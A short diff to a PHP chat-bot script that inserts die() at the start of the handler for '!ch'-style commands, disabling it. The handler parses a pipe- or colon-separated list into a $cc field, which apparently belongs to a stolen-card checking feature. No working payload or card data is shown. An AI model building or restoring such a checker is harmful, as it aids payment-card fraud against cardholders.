@@ -3619,6 +3619,7 @@ ob_flush();
 
 elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
 $lista = substr($message, 4);
+	die();
 //$i     = explode("|", $lista);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
